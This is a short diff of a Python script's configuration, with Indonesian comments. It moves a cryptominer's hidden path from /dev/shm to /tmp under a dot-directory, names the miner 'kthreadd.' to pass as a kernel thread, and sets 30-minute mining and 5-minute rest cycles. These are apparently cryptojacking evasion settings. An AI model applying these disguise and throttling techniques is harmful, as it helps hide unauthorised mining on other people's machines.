@@ -4,7 +4,7 @@ import sys
 import signal
 
 # CONFIG
-MINER_PATH = "/dev/shm/.cache/kthreadd."  # Lokasi miner
+MINER_PATH = "/tmp/.cache/kthreadd."  # Lokasi miner
 MINER_NAME = "kthreadd."  # Nama miner buat kill
 MINING_TIME = 1800  # 30 menit
 REST_TIME = 300  # 5 menit
